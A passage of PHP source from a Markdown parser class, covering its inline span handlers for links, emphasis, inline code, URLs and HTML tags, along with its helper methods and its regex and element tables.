                    $handler = 'identify' . $spanType;

                    $Span = $this->$handler( $Excerpt );

                    if ( ! isset( $Span ) ) {
                        continue;
                    }

                    # The identified span can be ahead of the marker.

                    if ( isset( $Span['position'] ) and $Span['position'] > $markerPosition ) {
                        continue;
                    }

                    # Spans that start at the position of their marker don't have to set a position.

                    if ( ! isset( $Span['position'] ) ) {
                        $Span['position'] = $markerPosition;
                    }

                    $plainText = substr( $text, 0, $Span['position'] );

                    $markup .= $this->readPlainText( $plainText );

                    $markup .= isset( $Span['markup'] ) ? $Span['markup'] : $this->element( $Span['element'] );

                    $text = substr( $text, $Span['position'] + $Span['extent'] );

                    $remainder = $text;

                    $markerPosition = 0;

                    continue 2;
                }

                $remainder = substr( $excerpt, 1 );

                $markerPosition ++;
            }

            $markup .= $this->readPlainText( $text );

            return $markup;
        }

        #
        # ~
        #

        protected function identifyUrl( $Excerpt ) {
            if ( ! isset( $Excerpt['text'][1] ) or $Excerpt['text'][1] !== '/' ) {
                return;
            }

            if ( preg_match( '/\bhttps?:[\/]{2}[^\s<]+\b\/*/ui', $Excerpt['context'], $matches, PREG_OFFSET_CAPTURE ) ) {
                $url = str_replace( array( '&', '<' ), array( '&amp;', '&lt;' ), $matches[0][0] );

                return array(
                    'extent'   => strlen( $matches[0][0] ),
                    'position' => $matches[0][1],
                    'element'  => array(
                        'name'       => 'a',
                        'text'       => $url,
                        'attributes' => array(
                            'href' => $url,
                        ),
                    ),
                );
            }
        }

        protected function identifyAmpersand( $Excerpt ) {
            if ( ! preg_match( '/^&#?\w+;/', $Excerpt['text'] ) ) {
                return array(
                    'markup' => '&amp;',
                    'extent' => 1,
                );
            }
        }

        protected function identifyStrikethrough( $Excerpt ) {
            if ( ! isset( $Excerpt['text'][1] ) ) {
                return;
            }

            if ( $Excerpt['text'][1] === '~' and preg_match( '/^~~(?=\S)(.+?)(?<=\S)~~/', $Excerpt['text'], $matches ) ) {
                return array(
                    'extent'  => strlen( $matches[0] ),
                    'element' => array(
                        'name'    => 'del',
                        'text'    => $matches[1],
                        'handler' => 'line',
                    ),
                );
            }
        }

        protected function identifyEscapeSequence( $Excerpt ) {
            if ( isset( $Excerpt['text'][1] ) and in_array( $Excerpt['text'][1], $this->specialCharacters ) ) {
                return array(
                    'markup' => $Excerpt['text'][1],
                    'extent' => 2,
                );
            }
        }

        protected function identifyLessThan() {
            return array(
                'markup' => '&lt;',
                'extent' => 1,
            );
        }

        protected function identifyUrlTag( $Excerpt ) {
            if ( strpos( $Excerpt['text'], '>' ) !== false and preg_match( '/^<(https?:[\/]{2}[^\s]+?)>/i', $Excerpt['text'], $matches ) ) {
                $url = str_replace( array( '&', '<' ), array( '&amp;', '&lt;' ), $matches[1] );

                return array(
                    'extent'  => strlen( $matches[0] ),
                    'element' => array(
                        'name'       => 'a',
                        'text'       => $url,
                        'attributes' => array(
                            'href' => $url,
                        ),
                    ),
                );
            }
        }

        protected function identifyEmailTag( $Excerpt ) {
            if ( strpos( $Excerpt['text'], '>' ) !== false and preg_match( '/^<(\S+?@\S+?)>/', $Excerpt['text'], $matches ) ) {
                return array(
                    'extent'  => strlen( $matches[0] ),
                    'element' => array(
                        'name'       => 'a',
                        'text'       => $matches[1],
                        'attributes' => array(
                            'href' => 'mailto:' . $matches[1],
                        ),
                    ),
                );
            }
        }

        protected function identifyTag( $Excerpt ) {
            if ( strpos( $Excerpt['text'], '>' ) !== false and preg_match( '/^<\/?\w.*?>/', $Excerpt['text'], $matches ) ) {
                return array(
                    'markup' => $matches[0],
                    'extent' => strlen( $matches[0] ),
                );
            }
        }

        protected function identifyInlineCode( $Excerpt ) {
            $marker = $Excerpt['text'][0];

            if ( preg_match( '/^(' . $marker . '+)[ ]*(.+?)[ ]*(?<!' . $marker . ')\1(?!' . $marker . ')/', $Excerpt['text'], $matches ) ) {
                $text = $matches[2];
                $text = htmlspecialchars( $text, ENT_NOQUOTES, 'UTF-8' );

                return array(
                    'extent'  => strlen( $matches[0] ),
                    'element' => array(
                        'name' => 'code',
                        'text' => $text,
                    ),
                );
            }
        }

        protected function identifyLink( $Excerpt ) {
            $extent = $Excerpt['text'][0] === '!' ? 1 : 0;

            if ( strpos( $Excerpt['text'], ']' ) and preg_match( '/\[((?:[^][]|(?R))*)\]/', $Excerpt['text'], $matches ) ) {
                $Link = array( 'text' => $matches[1], 'label' => strtolower( $matches[1] ) );

                $extent += strlen( $matches[0] );

                $substring = substr( $Excerpt['text'], $extent );

                if ( preg_match( '/^\s*\[([^][]+)\]/', $substring, $matches ) ) {
                    $Link['label'] = strtolower( $matches[1] );

                    if ( isset( $this->Definitions['Reference'][ $Link['label'] ] ) ) {
                        $Link += $this->Definitions['Reference'][ $Link['label'] ];

                        $extent += strlen( $matches[0] );
                    } else {
                        return;
                    }
                } elseif ( isset( $this->Definitions['Reference'][ $Link['label'] ] ) ) {
                    $Link += $this->Definitions['Reference'][ $Link['label'] ];

                    if ( preg_match( '/^[ ]*\[\]/', $substring, $matches ) ) {
                        $extent += strlen( $matches[0] );
                    }
                } elseif ( preg_match( '/^\([ ]*(.*?)(?:[ ]+[\'"](.+?)[\'"])?[ ]*\)/', $substring, $matches ) ) {
                    $Link['url'] = $matches[1];

                    if ( isset( $matches[2] ) ) {
                        $Link['title'] = $matches[2];
                    }

                    $extent += strlen( $matches[0] );
                } else {
                    return;
                }
            } else {
                return;
            }

            $url = str_replace( array( '&', '<' ), array( '&amp;', '&lt;' ), $Link['url'] );

            if ( $Excerpt['text'][0] === '!' ) {
                $Element = array(
                    'name'       => 'img',
                    'attributes' => array(
                        'alt' => $Link['text'],
                        'src' => $url,
                    ),
                );
            } else {
                $Element = array(
                    'name'       => 'a',
                    'handler'    => 'line',
                    'text'       => $Link['text'],
                    'attributes' => array(
                        'href' => $url,
                    ),
                );
            }

            if ( isset( $Link['title'] ) ) {
                $Element['attributes']['title'] = $Link['title'];
            }

            return array(
                'extent'  => $extent,
                'element' => $Element,
            );
        }

        protected function identifyEmphasis( $Excerpt ) {
            if ( ! isset( $Excerpt['text'][1] ) ) {
                return;
            }

            $marker = $Excerpt['text'][0];

            if ( $Excerpt['text'][1] === $marker and preg_match( $this->StrongRegex[ $marker ], $Excerpt['text'], $matches ) ) {
                $emphasis = 'strong';
            } elseif ( preg_match( $this->EmRegex[ $marker ], $Excerpt['text'], $matches ) ) {
                $emphasis = 'em';
            } else {
                return;
            }

            return array(
                'extent'  => strlen( $matches[0] ),
                'element' => array(
                    'name'    => $emphasis,
                    'handler' => 'line',
                    'text'    => $matches[1],
                ),
            );
        }

        #
        # ~

        protected function readPlainText( $text ) {
            $breakMarker = $this->breaksEnabled ? "\n" : "  \n";

            $text = str_replace( $breakMarker, "<br />\n", $text );

            return $text;
        }

        #
        # ~
        #

        protected function li( $lines ) {
            $markup = $this->lines( $lines );

            $trimmedMarkup = trim( $markup );

            if ( ! in_array( '', $lines ) and substr( $trimmedMarkup, 0, 3 ) === '<p>' ) {
                $markup = $trimmedMarkup;
                $markup = substr( $markup, 3 );

                $position = strpos( $markup, "</p>" );

                $markup = substr_replace( $markup, '', $position, 4 );
            }

            return $markup;
        }

        #
        # Multiton
        #

        static function instance( $name = 'default' ) {
            if ( isset( self::$instances[ $name ] ) ) {
                return self::$instances[ $name ];
            }

            $instance = new self();

            self::$instances[ $name ] = $instance;

            return $instance;
        }

        private static $instances = array();

        #
        # Deprecated Methods
        #

        /**
         * @deprecated in favor of "text"
         */
        function parse( $text ) {
            $markup = $this->text( $text );

            return $markup;
        }

        #
        # Fields
        #

        protected $Definitions;

        #
        # Read-only

        protected $specialCharacters = array(
            '\\',
            '`',
            '*',
            '_',
            '{',
            '}',
            '[',
            ']',
            '(',
            ')',
            '>',
            '#',
            '+',
            '-',
            '.',
            '!',
        );

        protected $StrongRegex = array(
            '*' => '/^[*]{2}((?:[^*]|[*][^*]*[*])+?)[*]{2}(?![*])/s',
            '_' => '/^__((?:[^_]|_[^_]*_)+?)__(?!_)/us',
        );

        protected $EmRegex = array(
            '*' => '/^[*]((?:[^*]|[*][*][^*]+?[*][*])+?)[*](?![*])/s',
            '_' => '/^_((?:[^_]|__[^_]*__)+?)_(?!_)\b/us',
        );

        protected $textLevelElements = array(
            'a',
            'br',
            'bdo',
            'abbr',
            'blink',
            'nextid',
            'acronym',
            'basefont',
            'b',
            'em',
            'big',
            'cite',
            'small',
            'spacer',
            'listing',
            'i',
            'rp',
            'del',
            'code',
            'strike',
            'marquee',
            'q',
            'rt',
            'ins',
            'font',
            'strong',
            's',
            'tt',
            'sub',
            'mark',
            'u',
            'xm',
            'sup',
            'nobr',
            'var',
            'ruby',
            'wbr',
            'span',
            'time',
        );
    }
